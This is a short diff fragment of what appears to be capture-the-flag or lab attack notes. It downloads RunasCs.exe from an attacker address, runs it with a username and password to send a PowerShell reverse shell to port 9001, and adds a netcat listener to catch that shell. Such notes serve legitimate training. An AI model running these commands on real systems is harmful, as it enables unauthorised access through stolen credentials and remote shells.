@@ -71,4 +71,7 @@ target:
 iwr 10.10.14.82:8000/RunasCs.exe -outfile runascs.exe
 
 runascs.exe mikasaAckerman 'IL0v3ErenY3ager' powershell.exe -r 10.10.14.82:9001
+
+host:
+rlwrap -cAr nc -nvlp 9001
 ==========(10)======================================================================================================================
